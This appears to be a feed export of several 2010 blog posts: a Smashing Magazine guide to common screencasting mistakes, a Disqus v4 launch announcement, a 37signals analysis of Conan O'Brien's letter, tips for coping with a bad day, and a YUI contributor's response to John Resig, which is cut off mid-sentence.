—  don’t realize. Someone watches a screencast to get information, but why not make it a pleasurable experience? Try to create interest by using animations and other techniques.</p><p>Another thing to keep in mind, is that there are some things a screencaster <strong>can assume:</strong> for example, that people can read and have used computers before, so they know how to click on parts of the screen and they know how to write.</p><p>In an online review of Snowtape, a Web radio recording application for Mac, the screencaster reads (starting at 0:38) <em>every</em> menu item in the Preferences. You don’t need to do that.   Aside from being boring, the screencaster <em>loses precious time</em> for the screencast. On YouTube, a video is usually limited to ten minutes in length. (Pro tip: I have successfully uploaded videos which were 10:50 without getting rejected.) Just going through every single menu entry cost the presenter two minutes of precious time! That means only eight more minutes to show the rest of the application.</p><p><iframe title=\"YouTube video player\" width=\"500\" height=\"314\" src=\"http://www.youtube.com/embed/rZuPcULnHrA\" frameborder=\"0\"></iframe></p><p>Some of my clients refuse to upload their videos to YouTube: Why should one want to upload a video to YouTube, rather than hosting on their own website? Creating a chic, customized Flash video player and all that stuff is fun, isn’t it? There’s one main reason why that’s not a good idea: YouTube is one of the biggest video websites we currently have on the Web. It attracts millions of users daily <em>and</em> has an <strong>embedding</strong> feature. Think of all the thousands of blogs out there. Creating a player just for one website is attractive, because the owner remains in control over the design and the video itself, but on the other hand, disallows and discourages their product from getting mentioned in —  for instance —  Smashing Magazine.</p><p>I would recommend staying within YouTube’s length boundaries not only for the sake of uploading a screencast, but also for the sake of audience <em>attention span.</em> Audience attention span seems to be gradually decreasing, which is another reason to keep a long story short. Common lengths for screencasts:</p><ul><li>Instructional (tutorial) screencasts: 8 – 10 minutes.</li><li>Advertising videos: 1 – 4 min.</li></ul><h3>Preparing Yourself</h3><p>My recommendation is to write your script <em>before</em> an actual recording. I have found mind maps handy for this job (I’m a big mindmap fan anyway and use it for all kinds of things, like planning; sorting; thinking).</p><p>A screencast should have <strong>structure</strong>, but don’t “overplan” recordings either as it will suck the spontaneity out of your screencast. Sometimes, meticulous planning and sticking to your script is necessary to make a very straight-to-the-point screencast. However, in most cases keeping everything natural for the audience is the topmost goal. My recommendation:</p><ul><li>Don’t try to sound unnatural by using overly complicated vocabulary. <strong>Keep it simple</strong>. Use spoken language. (No curse words!)</li><li>Try to follow the path laid out in the script, but feel free enough to make spontaneous remarks here and there. The audience will appreciate it! As I said before, they want to be entertained. Don’t try to sound like an over-enthusiastic moderator. You’re not! You won’t sound like yourself and your audience will switch off!</li><li>Organize in sections rather than trying for a single, long take. In most cases you may have to re-record several times, often because some little details didn’t work. This can cost you a lot of time, so dividing your screencast into sections makes recording much easier.</li></ul><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/12/divison.jpg\" width=\"500\" height=\"250\" alt=\"Divison in Most Common Mistakes in Screencasting\"><br><em>Sometimes, meticulous planning and sticking to your script is necessary to make a very straight-to-the-point screencast.</em></p><p>Sections should be three to five minutes each. After recording each section and saving it, import each section and put a transition between them. This is not only easy to do, it looks great, and helps the audience follow the screencast as they know that a new section begins when they see a transition.</p><p>One thing to keep in mind: <strong>use simple transitions over the fancy ones!</strong> Don’t think “awesome” transitions will also make a screencast look awesome. A bad screencast will not get a cool, fresh look from cool-looking transitions; what’s recorded, is recorded. Try to stick to the simple things; cross dissolve or dip through black, and if it has to look “flashy,” dip through white.</p><h3>Division</h3><p>When planning a screencast, I most often create three chapters:</p><ul><li>Beginner</li><li>Intermediate</li><li>Advanced</li></ul><h4>Beginner</h4><p>In the Beginner part, I talk about the <strong>basic functions</strong> of a program.<sup>[<a title=\"see footnote\" href=\"http://www.smashingmagazine.com/2010/12/09/most-common-mistakes-in-screencasting/#fn:using\">1</a>]</sup> I tell my audience who I am; what they are about to see; what this application is supposed to do; who made it; and so on. After this short introduction I show a simple, short workflow demonstrating what the application was made for. This, again, draws people’s attention to the screencast: “Hey, that looks really useful. I’m doing that a lot. Maybe I should continue watching.” Then, the Intermediate part begins.</p><h4>Intermediate</h4><p>After an introduction and showing some basic functions, it’s time to go into detail:</p><ul><li>What else does this software have to offer?</li><li>What are the functions a user discovers at second launch?</li></ul><p>For example, for a text editor I focus on functions that make this editor stand apart. I might talk about software interface, shortcuts and useful functions —  basically, the things users discover after the second or third time they launch the application.</p><h4>Advanced</h4><p>When it becomes clear what the application does, I then concentrate on showing the really <strong>advanced stuff</strong>. You have reached your goal when people think: “Wow! This is crazy! I didn’t even think that would be possible with this. I <em>really</em> need to check this out!” Maybe, it’s an export function nobody thinks of; or, a hidden preference setting somewhere. Who knows? This is why it’s so important to be well prepared and to be familiar with the product; for example, I recorded a screencast on how a very simple stop-motion app named <a title=\"Smoovie\" href=\"http://www.apple.com/downloads/macosx/video/smoovie.html\">Smoovie</a> can be used with AppleScript and Automator to record time lapse videos.</p><h3>Screen Recording Software</h3><p>People often wonder what screencasting tools are available, and how to decide on one or the other. Although some tools are already mentioned in the article <a href=\"http://www.smashingmagazine.com/2008/08/19/screencasting-how-to-start/\">Screencasting: How to Start, Tools and Guidelines</a>, I want to make a short addendum to this list. Since the release of Snow Leopard, QuickTime Player is also capable of recording the screen. Although it leaves an icon in the top-right of the screen, this is probably the cheapest solution.</p><p>Using simple “screen-record-only” software has the downside that you need to find other software to edit your video; this means, again, a bit more time and effort. If someone wants to take screencasting more seriously, I would recommend ScreenFlow or Camtasia. Both are well equipped “editing-and-recording-all-in-one” solutions able to handle everything needed for a good screencast. They have layers, editing tools, callout functionality and more. Most screencasters edit on ScreenFlow or an equivalent before exporting the video to Apple Final Cut or Adobe Premiere, where lower-thirds, transitions or a table of contents are added (this is the workflow of <a title=\"My Setup &amp; Workflow\" href=\"http://themacscreencastguy.squarespace.com/my-setup-workflow/\">Don McAllister</a>, for example).</p><h3>Animations (Using Zooms, Pans and Callouts)</h3><p>A common mistake among screencast newbies is not to make use of the zoom and pan functions. While I recommend their use, there is a slight difference between <strong>using and overusing</strong>.</p><h4>Zoom</h4><p>New screencasters often don’t use zoom <sup>[<a title=\"see footnote\" href=\"http://www.smashingmagazine.com/2010/12/09/most-common-mistakes-in-screencasting/#fn:zoom_scale\">2</a>]</sup> at all, but don’t be afraid to zoom in to show something with bigger detail. In a standard ten-minute screencast, often all I see is someone else’s screen; a moving cursor is all that changes, or maybe some windows pop open or a checkbox gets ticked. Wouldn’t you feel totally bored watching a moving mouse cursor move for ten minutes? I have had clients saying they want exactly that. Honestly, although I usually enjoy hearing myself talk, watching such screencasts makes me sleepy.</p><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/12/zoom.jpg\" width=\"500\" height=\"250\" alt=\"Zoom in Most Common Mistakes in Screencasting\"><br><em>Zoom in on a detail, talk about that function, and then zoom out or <a title=\"Pan\" href=\"http://www.smashingmagazine.com/2010/12/09/most-common-mistakes-in-screencasting/#pan\">pan</a> to the next function.</em></p><p><strong>So, make use of the zoom function</strong> to make a screencast a bit more <em>exciting.</em> Zoom in on a detail, talk about that function, and then zoom out or <a title=\"Pan\" href=\"http://www.smashingmagazine.com/2010/12/09/most-common-mistakes-in-screencasting/#pan\">pan</a> to the next function. That way people see a more dynamic visual change, which creates interest and holds peoples’ attention. As with other things, like callouts, this function should be used <em>wisely</em>: not wherever possible, but wherever useful.</p><h4>Pan</h4><p>While zoomed in on a detail, the audience can’t see everything outside the cutout. Pans are useful to move the “camera” around —  while remaining zoomed in! I use pans when my (mouse) cursor is about to move out of a cutout area. I try to move the camera along with the mouse pointer; that way the pan action looks very natural and seem to make more “sense” instead of moving the camera first, and then the mouse.</p><p>As a rule of thumb, choose the solution you think makes more sense to a person watching your screencast. <strong>Always consider the audience! </strong>Standard pan lengths, as well as standard zoom lengths, can get annoying as they are very repetitive. Professional screencasting applications allow you to customize the length of an action. Make use of that possibility!</p><h4>Callouts</h4><p>As an example of what not to do, a common mistake is to have the checkbox in ScreenFlow which says “Show modifier keys when pressed” enabled <em>during the entire screencast</em>. Another checkbox says to display mouse-clicks as Radar, or to make clicks audible. These options are not bad, but again, overusage is not a good thing; people intuitively know that when a window comes to the foreground, someone must have clicked on it, so why bother them with a stupid effect?</p><p>On the other hand, when saying something like: “…and when this checkbox is enabled, the app automatically does such-and-such…”, it’s a good idea to turn on visual click effects. Split the clip before the click happens, then split the clip afterwards, and enable click effects for this new separate clip. Done! Probably the best tip for you: use effects to support your explanations, not as something fancy to have. When I realized this, it changed my whole way of doing screencasts.</p><h3>Overlays And Lower-Thirds</h3><p>When all the edits are made, it’s a wise idea to add a bit more of that <em>extra magic</em> to the video such as a table of contents or lower-thirds. The options here are wide open. Although professional apps like Camtasia offer mandatory support for animations, they are no power houses in that regard. Try to find another application to create those overlays and import them to your screencast.</p><p>An animation program needs to be capable of producing <strong>transparent movies,</strong> which are added as a separate layers on top of the screencast. I create mine with Keynote, which can export transparent movies using the Share function. Go to <code>Share &gt; Export</code>. Then select <code>Custom…</code> in the <em>Formats</em> drop-down menu. Make sure to enable <em>Include transparency</em>. I use the Apple Animation codec for exporting.</p><p>Apart from Keynote or even Linux software, and if you want to invest a bit more money, Apple Final Cut Pro’s Motion; Adobe After Effects; Red5, and a lot of other programs are specialized for creating these effects. Most screencasters I know use the Apple Final Cut Pro Suite, where Motion is included. Others stick with After Effects. Both are professional, advanced tools.</p><h3>Recording Equipment</h3><p>The audio quality of a screencast is often determined by the hardware used. Many people use their built-in microphone on a laptop, which is fine most of the time but has several downsides:</p><ul><li>People will hear you typing and clicking.</li><li>The recording will have more hiss, because of the poor microphone quality.</li><li>The recording will have more ambient sound (such as a printer printing, the phone ringing, the wind blowing or a car honking).</li></ul><p>Buying a <em>good microphone</em> is another steep investment, but it’s definitely a good one that <strong>adds a lot of value to your recording equipment</strong>. Sure, for me as an audio engineer, it’s quite easy to pick the right set of equipment. But newcomers often have problems with this. The good news is that most screencasts don’t need high quality recording equipment. There are dynamic and diaphragm microphones to choose from; in my opinion, it is usually better to buy a <em>diaphragm microphone</em>, although it picks up more ambient noise. Dynamic microphones are less sensitive to accidental “pops” or other unwanted noise, but sound less clear and clean.</p><p><a href=\"http://www.flickr.com/photos/jaapstronks/3771904597/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/09/setup.jpg\" alt=\"Setup in Most Common Mistakes in Screencasting\" width=\"450\" height=\"300\"></a><br><em>Wrong tools doesn’t necessarily mean that you are using wrong coding or designing applications, it also can mean a wrong environment or computer setup. On the photo above, the setup looks solid and well-organized. <a href=\"http://www.flickr.com/photos/jaapstronks/3771904597/\">Image credit</a>.</em></p><p>I ended up buying a <strong>USB microphone</strong> that has an amplifier built-in, so it doesn’t need any other special equipment; dynamic microphones usually need a separate amplifier. I know some screencasters who buy “stand” microphones, which they attach to a freely movable arm that is attached to the wall. That way, they can move their microphone around and always have a good position to their microphone.</p><p>Placing a microphone is quite easy. I would recommend not putting the microphone directly in front of you, as some vowels (like “p” or “t”) can “pop” the microphone, resulting in a distorted recording. Most recording microphones have a <a href=\"http://en.wikipedia.org/wiki/Cardioid\">cardioid polar pattern</a> that records well when sound comes from the front, but is less sensitive to sound from the side and the back. As humans, we are <em>orbital emitters</em> which means that for us, speaking into a microphone placed <em>to the side</em> of our mouths sounds equally good as speaking directly into it. The only difference is that the “p” and “t” sounds don’t influence the diaphragms’ movement, because all of the sonic energy doesn’t go in the microphone’s direction. <sup>[<a title=\"see footnote\" href=\"http://www.smashingmagazine.com/2010/12/09/most-common-mistakes-in-screencasting/#fn:this_is_caused_by\">3</a>]</sup></p><p>Some screencasters, like me, prefer headset microphones as they are always the right distance to the mouth. A possible downside of professional diaphragm headset microphones, however, might be the need for a separate audio interface. Fortunately, mine wasn’t that expensive; I’m using a MiPRO MU-55HN.</p><p>I can’t recommend buying microphones that just “look good,” such as those blue-light emitting microphones. Low price usually means low quality. I suggest going into a professional music shop to ask for help, as they have enough experience to sell you the right microphone —  perhaps an even cheaper and better one —  than the amateur shops would.</p><h4>Recording Studio</h4><p>How do you choose an appropriate <em>recording studio?</em> Some people record their screencasts in their offices, which have bare walls; this makes the recording sound equally “bare,” like you have recorded in a washroom. There’s nothing you can do about that, except by putting more stuff on the walls and desks. Placing “reflecting material” helps the sonic waves spread across the room, resulting in better audio quality. <strong>The recorded voice will always sound like the room it has been recorded in.</strong> If it shouldn’t sound like your office, don’t record there! It’s simple as that! Spend one or two hours in a different venue getting your audio recording right, and then move back into your office for editing. It’s really worth it!</p><h3>Summary</h3><p>This article gives you a brief overview of some of the most common mistakes screencasting beginners make. I have great hopes now of seeing fewer screencasts recorded with a mobile phone! I tried to explain how to use <a title=\"Zoom\" href=\"http://www.smashingmagazine.com/2010/12/09/most-common-mistakes-in-screencasting/#zoom\">zoom</a> and <a title=\"Pan\" href=\"http://www.smashingmagazine.com/2010/12/09/most-common-mistakes-in-screencasting/#pan\">pan</a> more effectively and how to emphasize different portions of a screencast; we discussed that click effects, or keyboard-shortcut-overlays, should only be used wherever helpful, not wherever possible. Some of you may have decided to acquire additional or new gear for your recording equipment collection. And of course, choosing the right place to record your audio is the final icing on your screencasting cake.</p><h4>Footnotes</h4><div><ol><li>I’m using the word “application” here as an example, but it can apply to everything. <a title=\"Jump back to the article\" href=\"http://www.smashingmagazine.com/2010/12/09/most-common-mistakes-in-screencasting/#fnref:using\">(jump back to the article)</a></li><li>Zoom may be called “scale” depending on the software in use. Professional video editing suites tend to use the word scale rather than zoom, whereas screencast-specific programs use the word zoom instead of scale. <a title=\"return to article\" href=\"http://www.smashingmagazine.com/2010/12/09/most-common-mistakes-in-screencasting/#fnref:zoom_scale\">(jump back to the article)</a></li><li>This is because high frequency sounds are emitted more directly from our mouths. <a title=\"return to article\" href=\"http://www.smashingmagazine.com/2010/12/09/most-common-mistakes-in-screencasting/#fnref:this_is_caused_by\">(jump back to the article)</a></li></ol></div><p><em>(rs) (ik) (vf)</em></p><hr><p><small>© Andreas Zeitler for <a href=\"http://www.smashingmagazine.com\">Smashing Magazine</a>, 2010. | <a href=\"http://www.smashingmagazine.com/2010/12/09/most-common-mistakes-in-screencasting/\">Permalink</a> | <a href=\"http://www.smashingmagazine.com/2010/12/09/most-common-mistakes-in-screencasting/#comments\">Post a comment</a> | <a title=\"Bookmark in del.icio.us\" href=\"http://del.icio.us/post?url=http://www.smashingmagazine.com/2010/12/09/most-common-mistakes-in-screencasting/&amp;title=Most%20Common%20Mistakes%20in%20Screencasting\">Add to del.icio.us</a> | <a title=\"Bookmark in Digg\" href=\"http://digg.com/submit?phase=2&amp;url=http://www.smashingmagazine.com/2010/12/09/most-common-mistakes-in-screencasting/\">Digg this</a> | <a title=\"Stumble on StumbleUpon\" href=\"http://www.stumbleupon.com/submit?url=http://www.smashingmagazine.com/2010/12/09/most-common-mistakes-in-screencasting/\">Stumble on StumbleUpon!</a> | <a title=\"Tweet us!\" href=\"http://twitter.com/home?status=@tweetmeme%20@smashingmag%20Reading%20&#39;Most%20Common%20Mistakes%20in%20Screencasting&#39;%20http://www.smashingmagazine.com/2010/12/09/most-common-mistakes-in-screencasting/\">Tweet it!</a> | <a title=\"Bookmark in Reddit\" href=\"http://reddit.com/submit?url=http://www.smashingmagazine.com/2010/12/09/most-common-mistakes-in-screencasting/\">Submit to Reddit</a> | <a href=\"http://forum.smashingmagazine.com/\">Forum Smashing Magazine</a><br> Post tags: <a href=\"http://www.smashingmagazine.com/tag/screencasting/\" rel=\"tag\">screencasting</a><br> </small></p>"

      "content" : "<p>Disqus is the best way to build a community out of the comments on your blog or website. But Disqus is more than just a great tool for websites; it’s also a thriving network of discussions from the 500,000 communities connected through Disqus. And we’ve just hit a huge milestone — the Disqus network now reaches over 200 million people per month. That makes us the 4th largest network in the US <a href=\"http://www.quantcast.com/p-94WKwgUwZHlfo\">according to Quantcast</a>. We announced hitting <a href=\"http://blog.disqus.com/post/500724461/growing-fast-and-keeping-up\">100 million back in April</a>, so it only took about 6 months to double that traffic!</p>\n\n<p>To coincide with this, we’re announcing another type of milestone. Today we’re releasing the fourth major revision of Disqus. This new Disqus (referred to as v4 amongst our team) is comprised of dozens of enhancements, new features, and under-the-hood changes. Everything was designed to improve the usability, utility, and overall experience of Disqus. Here are some things we’re most excited about.</p>\n\n<h2>New design and interfaces</h2>\n\n<p><a href=\"http://disqus.com/welcome/\">Disqus.com</a> has a completely new design that we’re very proud of. We’ve revamped the user interface to be easier to navigate and more enjoyable to use. We were careful to retain many familiar parts of Disqus that worked well, and we believe that the many new changes are intuitive enough to immediately pick up. For admins, we’ve introduced a number of enhancements and refinements to existing tools throughout the website.</p>\n\n<p>Just want to poke around the new design? You can start by <a href=\"http://disqus.com/explore/\">exploring some of the 500,000 communities using Disqus</a>.</p>\n\n<h2>Dashboard for commenters</h2>\n\n<p><img src=\"http://media.tumblr.com/tumblr_lc0rkhF2it1qz5ese.png\" alt=\"\"></p>\n\n<p>Many people using the Disqus website are admins and moderators coming to manage the comments and other activity from their communities. But there also tons of Disqus users who are solely commenters (there are currently over 18 million profiles on Disqus). We’re introducing a new dashboard to help you manage your own comments. You can view and search all of your conversations from the dashboard, as well as edit or delete comments you’ve previously made.</p>\n\n<h2>Add-ons — enhanced tools for growing communities</h2>\n\n<p>About a year ago, we introduced Disqus VIP, a premium program for larger websites who would be using Disqus at big scale. Big scale meant that these websites would need tighter integration features, more powerful administration tools, and priority access to support. This was intended to be a fairly exclusive and limited program, but strong interest from users indicated to us that we needed to make these features and tools accessible to more Disqus users.</p>\n\n<p>Today, as part of the new Disqus, we’re introducing <a href=\"http://disqus.com/addons/\">Add-ons</a>. Add-ons are optional, premium tools and features that augment the core Disqus platform. They’re designed for growing communities that need the best tools and integration available from Disqus.</p>\n\n<p>What are some add-ons? <strong>Analytics</strong> gives you a unique insight into your community and its growth. <strong>Single sign-on</strong> lets you seamlessly integrate Disqus with your existing authentication system. An <strong>advanced theme editor</strong> lets you craft your own custom theme for use with the Disqus platform. <strong>Moderation logging and reporting</strong> are tools that are invaluable for websites with multiple moderators or admins. To view the full list, you can <a href=\"http://disqus.com/addons/\">visit the Add-ons page on Disqus</a>.</p>\n\n<p><img src=\"http://media.tumblr.com/tumblr_lc0rlk8MdI1qz5ese.png\" alt=\"\"><img src=\"http://media.tumblr.com/tumblr_lc0rm5rGfH1qz5ese.png\" alt=\"\"></p>\n\n<p>Currently, you can get add-ons by purchasing an add-ons package. You can activate a package on the add-ons page and start using the new features immediately. Packages start at $19/month (good for smaller blogs) or $199/month for the fuller Professional package (designed for pro-blogs, businesses, and networks).</p>\n\n<h2>The new API</h2>\n\n<p>As part of the new Disqus, we’re also introducing our new API. This is a completely new API, redesigned from scratch to support nearly everything we internally do with Disqus. It’s still a work in progress, but we’re already very happy with it. In fact, the new Disqus website was written using this exact API.</p>\n\n<p>So what can you do with it? Like most APIs, the Disqus API enables developers to interact with Disqus data from their own applications. You’ll be able to integrate Disqus into your own mobile apps, write plugins for more obscure platforms, and eventually you’ll even be able to write your own comment system frontend with this API.</p>\n\n<p>There’s a lot of great data in the 160+ million conversations across Disqus and we’d love to see all the cool stuff people do within their applications.</p>\n\n<p>Get started by checking out the <a href=\"http://disqus.com/api/\">new API docs</a>. Disqus also offers a new <a href=\"http://disqus.com/api/console/\">API console</a> (inspired by Twitter and Hurl) which allows you to run tests.</p>\n\n<p><img src=\"http://media.tumblr.com/tumblr_lc0rn3cnev1qz5ese.png\" alt=\"\"></p>\n\n<p>We hope you’ll enjoy the new Disqus. Let us know what you think in the comments! Not yet using Disqus on your website? <a href=\"http://disqus.com/welcome/\">Give it a try</a> — we think you’ll love the new version.</p>"

      "content" : "<p>When you think of great writing lessons, you usually don’t think of late-night TV hosts. But <a href=\"http://teamcoco.com/\">Conan O’Brien</a>’s <a href=\"http://www.huffingtonpost.com/2010/01/12/conan-obrien-statement-i_n_420521.html\">“People of Earth”</a> letter was a pitch-perfect response to a crisis situation. It became big news and set the tone for everything that happened afterwards in the <span>NBC</span>/Conan/Leno debacle. And it offers lessons for anyone who needs to put a public face on a shitty situation.</p>\n\n\n\t<p><strong>A closer look</strong> <br>\nThe note starts off light by addressing readers as the “People of Earth.” Then he  declares himself lucky.</p>\n\n\n<blockquote>\n\n\t<p>I want to start by making it clear that no one should waste a second feeling sorry for me. For 17 years, I’ve been getting paid to do what I love most and, in a world with real problems, I’ve been absurdly lucky.</p>\n\n\n</blockquote>\n\n\t<p>“Don’t feel sorry for me” is a great way to endear yourself to people in a time of trouble. Though this is obviously nowhere near a life-and-death situation, the approach here is vaguely reminiscent of Lou Gehrig <a href=\"http://www.lougehrig.com/about/speech.htm\">telling a stadium of fans</a> that, despite his illness, he considers himself “the luckiest man on the face of this earth.”</p>\n\n\n\t<p>Conan then lays out an argument that is based on the legacy of the Tonight Show as opposed to himself.</p>\n\n\n<blockquote>\n\n\t<p>I sincerely believe that delaying the Tonight Show into the next day to accommodate another comedy program will seriously damage what I consider to be the greatest franchise in the history of broadcasting. The Tonight Show at 12:05 simply isn’t the Tonight Show…My staff and I have worked unbelievably hard and we are very proud of our contribution to the legacy of The Tonight Show. But I cannot participate in what I honestly believe is its destruction.</p>\n\n\n</blockquote>\n\n\t<p>Now it’s about history, tradition, and Johnny instead of just some celeb moaning about being wronged.</p>\n\n\n\t<p>He closes by admitting that he has no idea where things will go from here.</p>\n\n\n<blockquote>\n\n\t<p>There has been speculation about my going to another network but, to set the record straight, I currently have no other offer and honestly have no idea what happens next.</p>\n\n\n</blockquote>\n\n\t<p>Instead of playing hardball, he plays heartfelt. And the honesty worked. People rallied to his side and <a href=\"http://teamcoco.com/\">Team Coco</a> was born.</p>\n\n\n\t<p><strong>The backstory</strong> <br>\nNow the behind-the-scenes story of how this letter came to be is coming to light. According to <a href=\"http://www.vanityfair.com/culture/features/2010/12/late-night-wars-excerpt-201012?printable=true#ixzz14R0IJcYP\">“The Unsocial Network,”</a> which looks at the Conan/Leno showdown, it started when Conan’s team first learned what <span>NBC</span> was up to. They reached out to “the best, toughest” litigator they knew, Patty Glaser, and she got together with Conan and his team.</p>\n<p><a href=\"http://37signals.com/svn/posts/2646-on-writing-how-conan-wrote-his-pitch-perfect-people-of-earth-letter\">More...</a></p><div>\n<a href=\"http://feeds.feedburner.com/~ff/37signals/beMH?a=hXLMVhuR5OM:CsTpUkdqw9I:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/37signals/beMH?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/37signals/beMH?a=hXLMVhuR5OM:CsTpUkdqw9I:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/37signals/beMH?d=7Q72WNTAKBA\" border=\"0\"></a>\n</div><img src=\"http://feeds.feedburner.com/~r/37signals/beMH/~4/hXLMVhuR5OM\" height=\"1\" width=\"1\">"

A bad work evaluation, a disappointing grade, a potential crush who turns out to be interested in someone else, a fight with your mother, a worrisome report from a doctor, a broken resolution…lousy days take many forms.</p>\n\n<p>Here are some strategies I use for coping with a lousy day:</p>\n\n<p>1. <strong>Resist the urge to “treat” yourself</strong>. Often, the things we choose as “treats” aren’t good for us. The pleasure lasts a minute, but then feelings of guilt, loss of control, and other negative consequences just deepen the lousiness of the day. So when you find yourself thinking, “I’ll feel better after I have a few beers…a pint of ice cream…a cigarette…a new pair of jeans,” ask yourself – will it REALLY make you feel better? It might make you feel worse.</p>\n\n<p>2. <strong>Do something nice for someone else</strong>. “Do good, feel good” – this really works. Be selfless, if only for selfish reasons. A friend going through a horrible period told me that she was practically addicted to doing good deeds; that was the only thing that made her feel better. </p>\n\n<p>3.<strong> Distract yourself</strong>. When my older daughter was born, she had to be in Neonatal Intensive Care for a week. I spent every hour at the hospital, until my husband dragged me away to go to an afternoon movie. I didn’t want to go, but afterward, I realized that I was much better able to cope with the situation after having had a bit of relief. Watching a funny movie or TV show is a great way to take a break, or I often re-read beloved classics of children's literature.</p>\n\n<p>4. <strong>Seek inner peace through outer order</strong>. Soothe yourself by tackling a messy closet, an untidy desk, or crowded countertops. The sense of tangible progress, control, and orderliness can be a comfort. This always works for me – and fortunately, my family is messy enough that I always have plenty of therapeutic clutter at hand.</p>\n\n<p>5. <strong>Tell yourself, “Well, at least I…</strong>” Get some things accomplished. Yes, you had a horrible day, but at least you went to the gym, or played with your kids, or walked the dog, or read your children a story, or recycled.</p>\n\n<p>6. <strong>Exercise is an extremely effective mood booster</strong> – but be careful of exercise that allows you to ruminate. For example, if I go for a walk when I’m upset about something, I often end up feeling worse, because the walk provides me with uninterrupted time in which to dwell obsessively on my troubles.</p>\n\n<p>7. <strong>Stay in contact</strong>. When you’re having a lousy day, it’s tempting to retreat into isolation. Studies show, though, that contact with other people boosts mood. So try to see or talk to people, especially people you’re close to.</p>\n\n<p>8. It’s a cliché, but <strong>things really will look brighter in the morning</strong>. Go to bed early and start the next day anew. Also, sleep deprivation puts a drag on mood in the best of circumstances, so a little extra sleep will do you good.</p>\n\n<p>9. <strong>Remind yourself of your other identities</strong>. If you feel like a loser at work, send out a blast email to engage with college friends. If you think members of the PTA are mad at you, don’t miss the spinning class where everyone knows and likes you.</p>\n\n<p>10. <strong>Keep perspective</strong>. Ask yourself: “Will this matter in a month? In a year?” I recently came across a note I’d written to myself years ago, that said “TAXES!!!!!!!!!!!!!” I dimly remember the panic I felt about dealing with taxes that year; but it’s all lost and forgotten now.</p>\n\n<p>11. <strong>Write it down</strong>. When something horrible is consuming my mind, I find that if I write up a paragraph or two about the situation, I get immense relief.</p>\n\n<p>12. <strong>Be grateful</strong>. Remind yourself that a <em>lousy </em>day isn’t a <em>catastrophic </em>day. Be grateful that you’re still on the “lousy” spectrum. Probably, things could be worse.</p>\n\n<p>13. <strong>Use the emergency mood tool-kit</strong>. For an emergency happiness intervention, try these tips for <a href=\"http://www.happiness-project.com/happiness_project/2007/04/seven_tips_for_.html\">getting a boost in the next HOUR</a>.\n\n<p>What other strategies have you used to deal with a lousy day? It's helpful to have a lot of options from which to choose.</p>\n\n<p>* My children's literature/young-adult literature reading groups are famous!

      "content" : "<p>Earlier today, someone posted the following question on <a href=\"http://www.quora.com\">Quora</a>: <a href=\"http://www.quora.com/How-could-YUI3-improve-its-image-compared-to-jQuery-MooTools-etc/\">How could YUI improve its image compared to jQuery, MooTools, etc.?</a> It’s an interesting question that got some interesting responses. The most <a href=\"http://www.quora.com/How-could-YUI3-improve-its-image-compared-to-jQuery-MooTools-etc/answer/John-Resig?srid=5i2\">interesting response</a>, as many now have seen, came from jQuery creator John Resig. He wrote a very thoughtful piece that gives some great insights into how jQuery created such a large and vibrant community. However, there were a few points that are factually wrong and others on which I strenuously disagree.</p>\n<p>Before diving into this topic, I want to be upfront: I work for Yahoo! and I’m a YUI contributor though not a core team member. Therefore, my opinion here does not represent the opinion of Yahoo! or YUI; this is simply my points of view on John’s feedback. I should also mention that I have a lot of respect for John, the jQuery core team, and the entire jQuery community, so please don’t take any of my comments to mean anything different.</p>\n<p>First, I completely agree that the documentation fragmentation is a problem. More than one person has been confused about whether to go to the <a href=\"http://developer.yahoo.com/yui/\">Yahoo! Developer Network</a> or <a href=\"http://yuilibrary.com\">YUILibrary.com</a>, that’s a definite problem that needs addressing. John also has a great suggestion on narrowing the focus of the YUI landing page to sell using the library over other messaging. Excellent idea.</p>\n<p>John’s next section goes into ways that YUI can compete directly against jQuery. I’ve been <a href=\"http://twitter.com/slicknet/status/29582065891\">saying</a> for a while that I don’t see these two as competitors. Making YUI more like jQuery isn’t something I want in any way. Both libraries have their strengths and the overlap is minimal. jQuery is great for smaller sites and it’s easy for anyone to pick and use, which is why there is such a strong designer community…but I wouldn’t want to use it to create the Yahoo! homepage. For scalable web applications, YUI really excels. I don’t believe you can serve both audiences effectively with the same product, and since jQuery does such a fantastic job at its focus, I would much rather have YUI focused on the web application problem.</p>\n<p>My main disagreement with John’s post is around this statement:</p>\n<blockquote><p>The YUI project has always had the advantage of having a large number of paid, full-time, contributors to the project. As far as I can tell it’s always had more paid, full-time, contributors than any other JavaScript library. This is awesome and it’s benefited the library as a whole. However it can also be crippling. Yahoo completely controls the direction and destiny of YUI. This should not be the case – YUI should be split off from Yahoo and become its own, separate, Open Source project.</p></blockquote>\n<p>This is a sentiment I’ve heard from time to time while giving talks, and it’s something that I don’t understand and seriously disagree with. There seems to be a notion amongst the open source community that nothing can truly be “open source” unless it is purely autonomous and not tied to any particular company. This is a conversation I had with someone after one of my talks about YUI:</p>\n<p><strong>Him:</strong> You know, I really like YUI and want to use it, but it’s the “Y” in YUI that makes me uncomfortable.<br>\n<strong>Me:</strong> What makes you more uncomfortable, is it that there are people paid full time to develop and support it or that it’s been battle tested on some of the world’s most highly-trafficked web sites?</p>\n<p>To me, <em>what makes YUI valuable has been and will continue to be the affiliation with Yahoo!</em>. It’s through the experience of working with teams within Yahoo! that the YUI library has grown into the rock-solid product that it is today. I say this having worked closely with the YUI team during the early days of YUI 3 as we used the <a href=\"http://yuiblog.com/blog/2008/11/11/frontpage-and-yui3/\">new Yahoo! homepage as a testing ground</a>. How many other libraries can say that they were testing on a top-5 web site? And how many can say that they are constantly getting feedback from some of the world’s most popular web destinations that handle millions upon millions of requests per day?</p>\n<p>Removing YUI from Yahoo! cuts off the library’s main strategic advantage. When working on top-secret projects, it’s impossible to involve a public community in that process. At Yahoo!, we can get in touch with the YUI team, explain what we’re doing and the help we need, work to come up with solutions to these problems, and then <em>all YUI users benefit from that interaction</em>. All of the hard work of Yahoo! engineers gets poured back into YUI as a whole.</p>\n<p>As for the belief that Yahoo! controlling the library’s destiny is a bad thing, I can’t disagree more. Once again, this is what makes YUI valuable. Every open source project has a core team whose job is to maintain the original vision of the project as well as guide its development and roadmap. The fact that the YUI core team is paid by Yahoo! doesn’t change the basic structure of any project. You can only look to the next city over and the Mozilla Foundation as a great example of a similar system. The core Mozilla team decides how Firefox evolves, and the fact that Mozilla writes their paychecks 